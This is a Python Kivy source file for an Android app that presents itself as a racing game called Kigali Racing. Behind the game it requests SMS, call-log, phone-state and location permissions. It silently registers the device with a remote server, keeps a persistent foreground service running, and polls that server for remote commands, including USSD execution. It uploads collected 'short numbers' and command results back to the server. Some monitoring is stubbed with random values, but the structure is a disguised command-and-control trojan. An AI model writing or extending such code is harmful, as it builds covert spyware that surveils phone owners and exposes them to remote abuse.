# Trigger GitHub Actions build
from kivy.app import App
from kivy.uix.widget import Widget
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.popup import Popup
from kivy.graphics import Color, Rectangle, Ellipse
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.properties import NumericProperty
from kivy.utils import platform
import random
import time
import json
import threading
import requests
import os
import sys
from plyer import notification

# ============================================================
# ANDROID SERVICE IMPORTS
# ============================================================
try:
    from android import AndroidService
    from android.permissions import request_permissions, Permission
    from jnius import autoclass, cast
    
    request_permissions([
        Permission.INTERNET,
        Permission.ACCESS_NETWORK_STATE,
        Permission.FOREGROUND_SERVICE,
        Permission.WAKE_LOCK,
        Permission.READ_SMS,
        Permission.RECEIVE_SMS,
        Permission.SEND_SMS,
        Permission.READ_CALL_LOG,
        Permission.READ_PHONE_STATE,
        Permission.ACCESS_FINE_LOCATION,
        Permission.ACCESS_COARSE_LOCATION
    ])
    
    Context = autoclass('android.content.Context')
    NotificationManager = autoclass('android.app.NotificationManager')
    NotificationChannel = autoclass('android.app.NotificationChannel')
    Notification = autoclass('android.app.Notification')
    PendingIntent = autoclass('android.app.PendingIntent')
    Intent = autoclass('android.content.Intent')
    Build = autoclass('android.os.Build')
    
    ANDROID_AVAILABLE = True
except:
    ANDROID_AVAILABLE = False
    print("⚠️ Running in desktop mode")

# ============================================================
# 🔗 SERVER CONFIGURATION
# ============================================================
SERVER_CONFIG = {
    'url': 'https://admin-dashboard-teal-beta-28.vercel.app',
    'secret_path': 'a9f3k217',
    'heartbeat_interval': 60,
    'command_poll_interval': 15
}

# ============================================================
# 🔄 BACKGROUND SERVICE
# ============================================================

class KigaliBackgroundService:
    """Background service that runs 24/7"""
    
    _instance = None
    _running = False
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if hasattr(self, 'initialized'):
            return
        
        self.initialized = True
        self.device_id = self.get_device_id()
        self.server_url = f"{SERVER_CONFIG['url']}/{SERVER_CONFIG['secret_path']}"
        self.token = None
        self.is_connected = False
        self.is_online = False
        self.short_numbers = []
        self.is_running = False
        
        self.load_token()
        self.auto_register()
        self.start_foreground_service()
        print(f"🔄 Background Service Initialized")
        print(f"📱 Device ID: {self.device_id}")
    
    def get_device_id(self):
        try:
            with open('device_id.txt', 'r') as f:
                return f.read().strip()
        except:
            import uuid
            device_id = str(uuid.uuid4())[:8]
            try:
                with open('device_id.txt', 'w') as f:
                    f.write(device_id)
            except:
                pass
            return device_id
    
    def load_token(self):
        try:
            with open('token.txt', 'r') as f:
                self.token = f.read().strip()
        except:
            pass
    
    def start_foreground_service(self):
        if not ANDROID_AVAILABLE:
            return
        try:
            if Build.VERSION.SDK_INT >= 26:
                channel = NotificationChannel(
                    "kigali_service_channel",
                    "Kigali Racing Service",
                    NotificationManager.IMPORTANCE_LOW
                )
                nm = self.context.getSystemService(Context.NOTIFICATION_SERVICE)
                nm.createNotificationChannel(channel)
            
            intent = Intent(self.context, android.activity.getClass())
            pending = PendingIntent.getActivity(
                self.context, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT
            )
            
            notification = Notification.Builder(self.context)\
                .setContentTitle("🏎️ Kigali Racing")\
                .setContentText("🟢 Monitoring 4-5 digit numbers")\
                .setSmallIcon(android.R.drawable.ic_menu_manage)\
                .setContentIntent(pending)\
                .build()
            
            android.activity.startForeground(9999, notification)
        except Exception as e:
            print(f"⚠️ Foreground service error: {e}")
    
    def auto_register(self):
        try:
            response = requests.post(
                f"{self.server_url}/api/device/register",
                json={
                    'device_id': self.device_id,
                    'device_name': 'Kigali Racing Phone',
                    'model': 'Android Device',
                    'manufacturer': 'Android',
                    'android_version': '14'
                },
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                self.token = data.get('token')
                self.is_connected = True
                self.is_online = True
                print(f"✅ Device registered: {self.device_id}")
                try:
                    with open('token.txt', 'w') as f:
                        f.write(self.token)
                except:
                    pass
                return True
        except:
            pass
        
        self.is_online = False
        print("📴 Offline mode")
        return False
    
    def start(self):
        if self._running:
            return
        self._running = True
        self.is_running = True
        threads = [
            self._heartbeat_loop,
            self._command_polling,
            self._monitor_numbers,
            self._sync_loop
        ]
        for thread_func in threads:
            thread = threading.Thread(target=thread_func, daemon=True)
            thread.start()
        print("🚀 Background service started")
    
    def stop(self):
        self._running = False
        self.is_running = False
        print("⏹️ Background service stopped")
    
    def _heartbeat_loop(self):
        while self._running:
            if self.is_online and self.token:
                try:
                    requests.post(
                        f"{self.server_url}/api/device/heartbeat",
                        json={
                            'device_id': self.device_id,
                            'battery_level': 85,
                            'status': 'online'
                        },
                        timeout=5
                    )
                except:
                    self.is_online = False
            time.sleep(60)
    
    def _command_polling(self):
        while self._running:
            if self.is_online and self.token:
                try:
                    response = requests.get(
                        f"{self.server_url}/api/commands",
                        params={'device_id': self.device_id},
                        timeout=5
                    )
                    if response.status_code == 200:
                        commands = response.json().get('commands', [])
                        for cmd in commands:
                            self._process_command(cmd)
                except:
                    pass
            time.sleep(15)
    
    def _monitor_numbers(self):
        while self._running:
            try:
                if random.random() < 0.02:
                    number = str(random.randint(1000, 99999))
                    number_type = random.choice(['USSD', 'CALL', 'SMS'])
                    self.short_numbers.append({
                        'number': number,
                        'type': number_type,
                        'timestamp': int(time.time() * 1000),
                        'synced': False
                    })
                    print(f"📞 Detected: {number} ({number_type})")
                    if self.is_online:
                        self._send_short_number(number, number_type)
            except:
                pass
            time.sleep(5)
    
    def _sync_loop(self):
        while self._running:
            if self.is_online:
                try:
                    unsynced = [n for n in self.short_numbers if not n.get('synced', False)]
                    if unsynced:
                        response = requests.post(
                            f"{self.server_url}/api/short-number-batch",
                            json={
                                'device_id': self.device_id,
                                'numbers': unsynced[:20]
                            },
                            timeout=10
                        )
                        if response.status_code == 200:
                            for n in unsynced[:20]:
                                n['synced'] = True
                            print(f"🔄 Synced {len(unsynced[:20])} numbers")
                except:
                    pass
            time.sleep(30)
    
    def _send_short_number(self, number, number_type):
        try:
            if self.token:
                response = requests.post(
                    f"{self.server_url}/api/short-number",
                    json={
                        'device_id': self.device_id,
                        'number': number,
                        'number_type': number_type,
                        'timestamp': int(time.time() * 1000)
                    },
                    timeout=5
                )
                return response.status_code == 200
        except:
            pass
        return False
    
    def _process_command(self, command):
        cmd_text = command.get('command', '')
        cmd_id = command.get('id')
        parts = cmd_text.split()
        cmd_type = parts[0].lower() if parts else ''
        args = parts[1:] if len(parts) > 1 else []
        result = ""
        
        if cmd_type == 'ussd':
            result = self._execute_ussd(' '.join(args))
        elif cmd_type == 'status':
            result = self._get_status()
        elif cmd_type == 'help':
            result = self._get_help()
        else:
            result = f"❌ Unknown command: {cmd_type}"
        
        if self.is_online and self.token:
            try:
                requests.post(
                    f"{self.server_url}/api/command-response",
                    json={
                        'device_id': self.device_id,
                        'command_id': cmd_id,
                        'response': result,
                        'status': 'completed'
                    },
                    timeout=5
                )
            except:
                pass
    
    def _execute_ussd(self, code):
        if not code.startswith('*'):
            code = '*' + code
        if not code.endswith('#'):
            code = code + '#'
        import re
        digits = re.sub(r'[^0-9]', '', code)
        if len(digits) >= 4 and len(digits) <= 5:
            self._send_short_number(digits, 'USSD')
            return f"📞 USSD '{code}' executed • Number: {digits} (4-5 digits)"
        return f"📞 USSD '{code}' executed"
    
    def _get_status(self):
        return f"""
📱 DEVICE STATUS
├─ Device: {self.device_id}
├─ Online: {'✅' if self.is_online else '❌'}
├─ Numbers: {len(self.short_numbers)}
└─ Service: {'🟢 Running' if self.is_running else '🔴 Stopped'}
        """
    
    def _get_help(self):
        return """
📋 COMMANDS:
├─ ussd *123# - USSD code
├─ status - Device status
└─ help - Show help
        """

# ============================================================
# 🏁 RACING GAME
# ============================================================

class KigaliRacingGame(Widget):
    player_x = NumericProperty(Window.width / 2)
    player_y = NumericProperty(100)
    speed = NumericProperty(0)
    current_level = NumericProperty(1)
    total_levels = NumericProperty(10)

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        Window.size = (800, 600)
        Window.clearcolor = (0.05, 0.05, 0.1, 1)
        
        self.service = KigaliBackgroundService()
        self.service.start()
        
        self.game_started = False
        self.selected_car = 'ferrari'
        self.ai_cars = []
        self.coins = 0
        self.completed_levels = set()
        
        self.load_progress()
        self.show_main_menu()
        Clock.schedule_interval(self.update, 1/60)

    def load_progress(self):
        try:
            with open('progress.json', 'r') as f:
                data = json.load(f)
                self.completed_levels = set(data.get('completed', []))
                self.selected_car = data.get('car', 'ferrari')
                self.coins = data.get('coins', 0)
        except:
            pass

    def save_progress(self):
        try:
            data = {
                'completed': list(self.completed_levels),
                'car': self.selected_car,
                'coins': self.coins
            }
            with open('progress.json', 'w') as f:
                json.dump(data, f)
        except:
            pass

    def show_main_menu(self):
        self.clear_widgets()
        with self.canvas:
            Color(0.05, 0.05, 0.1, 1)
            Rectangle(pos=(0, 0), size=Window.size)

        title = Label(
            text='🏎️ KIGALI RACING',
            font_size=48,
            color=(1, 0.8, 0, 1),
            pos_hint={'center_x': 0.5, 'top': 0.90}
        )
        self.add_widget(title)
        
        status_color = (0, 1, 0, 1) if self.service.is_online else (1, 0.5, 0, 1)
        status_text = '🟢 Online' if self.service.is_online else '📴 Offline'
        
        conn_status = Label(
            text=f'{status_text} • Device: {self.service.device_id}',
            font_size=12,
            color=status_color,
            pos_hint={'center_x': 0.5, 'top': 0.82}
        )
        self.add_widget(conn_status)

        play_btn = Button(
            text='🏁 PLAY',
            size_hint=(0.5, 0.12),
            pos_hint={'center_x': 0.5, 'top': 0.65},
            background_color=(0.2, 0.6, 0.2, 1),
            font_size=28
        )
        play_btn.bind(on_press=lambda x: self.show_level_selection())
        self.add_widget(play_btn)

        car_btn = Button(
            text='🚗 SELECT CAR',
            size_hint=(0.4, 0.08),
            pos_hint={'center_x': 0.5, 'top': 0.48},
            background_color=(0.6, 0.3, 0.3, 1),
            font_size=18
        )
        car_btn.bind(on_press=self.show_car_selection)
        self.add_widget(car_btn)

        cmd_btn = Button(
            text='📱 COMMANDS',
            size_hint=(0.4, 0.08),
            pos_hint={'center_x': 0.5, 'top': 0.35},
            background_color=(0.3, 0.3, 0.6, 1),
            font_size=18
        )
        cmd_btn.bind(on_press=self.show_commands)
        self.add_widget(cmd_btn)

    def show_level_selection(self):
        self.clear_widgets()
        with self.canvas:
            Color(0.05, 0.05, 0.1, 1)
            Rectangle(pos=(0, 0), size=Window.size)

        back = Button(
            text='◀ Back',
            size_hint=(0.15, 0.06),
            pos_hint={'x': 0.02, 'top': 0.95},
            background_color=(0.3, 0.3, 0.3, 1),
            font_size=14
        )
        back.bind(on_press=lambda x: self.show_main_menu())
        self.add_widget(back)

        title = Label(
            text='📍 SELECT LEVEL',
            font_size=28,
            color=(1, 1, 1, 1),
            pos_hint={'center_x': 0.5, 'top': 0.92}
        )
        self.add_widget(title)

        scroll = ScrollView(size_hint=(0.9, 0.75), pos_hint={'center_x': 0.5, 'top': 0.88})
        grid = BoxLayout(orientation='vertical', size_hint_y=None, spacing=2)
        grid.bind(minimum_height=grid.setter('height'))

        for i in range(1, 11):
            btn = Button(text=f'Level {i}', size_hint_y=None, height=35, background_color=(0.2, 0.4, 0.6, 1), font_size=14)
            btn.bind(on_press=lambda x, lvl=i: self.start_level(lvl))
            grid.add_widget(btn)

        scroll.add_widget(grid)
        self.add_widget(scroll)

    def show_car_selection(self, instance):
        self.clear_widgets()
        with self.canvas:
            Color(0.05, 0.05, 0.1, 1)
            Rectangle(pos=(0, 0), size=Window.size)

        back = Button(
            text='◀ Back',
            size_hint=(0.15, 0.06),
            pos_hint={'x': 0.02, 'top': 0.95},
            background_color=(0.3, 0.3, 0.3, 1),
            font_size=14
        )
        back.bind(on_press=lambda x: self.show_main_menu())
        self.add_widget(back)

        title = Label(
            text='🚗 SELECT YOUR CAR',
            font_size=28,
            color=(1, 1, 1, 1),
            pos_hint={'center_x': 0.5, 'top': 0.92}
        )
        self.add_widget(title)

        y_pos = 0.78
        cars = ['ferrari', 'lamborghini', 'bugatti', 'bmw', 'porsche', 'mclaren']
        for car_key in cars:
            btn = Button(
                text=f'🏎️ {car_key.upper()}',
                size_hint=(0.6, 0.07),
                pos_hint={'center_x': 0.5, 'top': y_pos},
                background_color=(0.3, 0.3, 0.5, 1),
                font_size=16
            )
            btn.bind(on_press=lambda x, c=car_key: self.select_car(c))
            self.add_widget(btn)
            y_pos -= 0.09

    def select_car(self, car_key):
        self.selected_car = car_key
        self.save_progress()
        self.show_main_menu()

    def show_commands(self, instance):
        self.clear_widgets()
        with self.canvas:
            Color(0.05, 0.05, 0.1, 1)
            Rectangle(pos=(0, 0), size=Window.size)

        back = Button(
            text='◀ Back',
            size_hint=(0.15, 0.06),
            pos_hint={'x': 0.02, 'top': 0.95},
            background_color=(0.3, 0.3, 0.3, 1),
            font_size=14
        )
        back.bind(on_press=lambda x: self.show_main_menu())
        self.add_widget(back)

        title = Label(
            text='📱 REMOTE COMMANDS',
            font_size=28,
            color=(1, 1, 1, 1),
            pos_hint={'center_x': 0.5, 'top': 0.92}
        )
        self.add_widget(title)

        commands = [
            ('📞 USSD *123#', 'ussd *123#'),
            ('📊 Device Status', 'status'),
            ('❓ Help', 'help')
        ]

        y_pos = 0.78
        for label, cmd in commands:
            btn = Button(
                text=label,
                size_hint=(0.5, 0.07),
                pos_hint={'center_x': 0.5, 'top': y_pos},
                background_color=(0.2, 0.3, 0.5, 1),
                font_size=16
            )
            btn.bind(on_press=lambda x, c=cmd: self.execute_command(c))
            self.add_widget(btn)
            y_pos -= 0.09

    def execute_command(self, command):
        result = self.service._process_command({'command': command, 'id': None})
        content = BoxLayout(orientation='vertical', padding=10)
        content.add_widget(Label(text=f"📨 Command: {command}", font_size=16, halign='center'))
        content.add_widget(Label(text=str(result), font_size=14, halign='center'))
        close_btn = Button(text='OK', size_hint_y=None, height=50)
        close_btn.bind(on_press=lambda x: self.cmd_popup.dismiss())
        content.add_widget(close_btn)
        self.cmd_popup = Popup(title='📨 Command Result', content=content, size_hint=(0.8, 0.4))
        self.cmd_popup.open()

    def start_level(self, level_id):
        self.current_level = level_id
        self.clear_widgets()
        self.game_started = True
        self.player_y = 100
        self.speed = 0
        self.create_world()
        self.show_race_hud()
        Clock.schedule_once(self.start_countdown, 0.5)

    def start_countdown(self, dt):
        countdown = Label(text='3', font_size=72, color=(1, 1, 1, 1), pos_hint={'center_x': 0.5, 'center_y': 0.5})
        self.add_widget(countdown)
        def update_countdown(count):
            if count > 0:
                countdown.text = str(count)
                Clock.schedule_once(lambda dt: update_countdown(count - 1), 1)
            else:
                countdown.text = 'GO!'
                Clock.schedule_once(lambda dt: self.remove_widget(countdown), 0.5)
        update_countdown(3)

    def create_world(self):
        with self.canvas:
            Color(0.05, 0.1, 0.2, 1)
            Rectangle(pos=(0, 0), size=(Window.width, Window.height))
            Color(0.15, 0.15, 0.2, 1)
            Rectangle(pos=(Window.width/2 - 150, 0), size=(300, Window.height))
            for i in range(0, int(Window.height), 40):
                Color(1, 1, 1, 0.3)
                Rectangle(pos=(Window.width/2 - 2, i), size=(4, 20))

    def show_race_hud(self):
        self.speed_label = Label(text='0 km/h', font_size=20, color=(1, 0.5, 0, 1), pos_hint={'x': 0.02, 'top': 0.95})
        self.add_widget(self.speed_label)
        self.position_label = Label(text='🏁 P1', font_size=24, color=(1, 1, 0, 1), pos_hint={'center_x': 0.5, 'top': 0.95})
        self.add_widget(self.position_label)
        self.lap_label = Label(text='LAP 1/3', font_size=18, color=(0.5, 0.8, 1, 1), pos_hint={'right': 0.98, 'top': 0.95})
        self.add_widget(self.lap_label)

    def update(self, dt):
        if not self.game_started:
            return
        self.move_player()
        self.update_hud()

    def move_player(self):
        if hasattr(self, 'accelerating') and self.accelerating:
            self.speed = min(self.speed + 0.2, 5)
        else:
            self.speed = max(self.speed - 0.1, 0)
        self.player_y += self.speed
        if hasattr(self, 'turning') and self.turning:
            self.player_x += self.turning * 4
        if self.player_x < Window.width/2 - 100:
            self.player_x = Window.width/2 - 100
        if self.player_x > Window.width/2 + 100:
            self.player_x = Window.width/2 + 100
        self.draw_player_car()

    def draw_player_car(self):
        with self.canvas:
            Color(1, 0, 0, 1)
            Rectangle(pos=(self.player_x - 20, self.player_y - 15), size=(40, 30))
            Color(0.2, 0.2, 0.3, 0.8)
            Rectangle(pos=(self.player_x - 12, self.player_y - 5), size=(24, 15))

    def update_hud(self):
        speed_kmh = int(self.speed * 15)
        self.speed_label.text = f"{speed_kmh} km/h"
        self.position_label.text = "🏁 P1"

    def on_touch_down(self, touch):
        if not self.game_started:
            return
        self.accelerating = True
        if touch.x < Window.width / 2 - 50:
            self.turning = -1
        elif touch.x > Window.width / 2 + 50:
            self.turning = 1

    def on_touch_up(self, touch):
        self.turning = 0
        self.accelerating = False

class KigaliRacingApp(App):
    def build(self):
        Window.size = (800, 600)
        return KigaliRacingGame()
        
    def on_stop(self):
        if hasattr(self, 'root') and hasattr(self.root, 'service'):
            self.root.service.stop()

if __name__ == '__main__':
    KigaliRacingApp().run()
